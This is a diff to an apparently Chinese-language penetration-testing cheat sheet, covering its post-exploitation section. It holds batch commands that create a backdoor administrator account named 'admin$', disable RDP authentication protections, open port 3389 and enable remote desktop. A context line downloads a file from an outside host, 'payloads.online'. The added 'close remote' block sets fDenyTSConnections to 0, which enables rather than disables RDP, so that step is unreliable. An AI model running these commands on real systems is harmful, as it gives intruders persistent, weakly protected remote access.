@@ -12,19 +12,25 @@ $client.DownloadFile(‘http://payloads.online/file.tar.gz', ‘E:\file.tar.gz�
 
 ## 渗透后置操作
 
-```bash
+```bat
 net user admin$ tuser321 /add
 net localgroup administrators admin$ /add
 REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
 REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0
 netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
-REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer" /v fDenyTSConnections /t REG_DWORD /D 0 /f
+
+:: 开启远程
+wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
 echo 远程桌面端口 port number is 
 REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
 
 gpupdate /force
 # 查看开了哪些端口
 netstat -aon
+
+:: 关闭远程
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /D 0 /f
+wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0
 ```
 
 ## FAQ
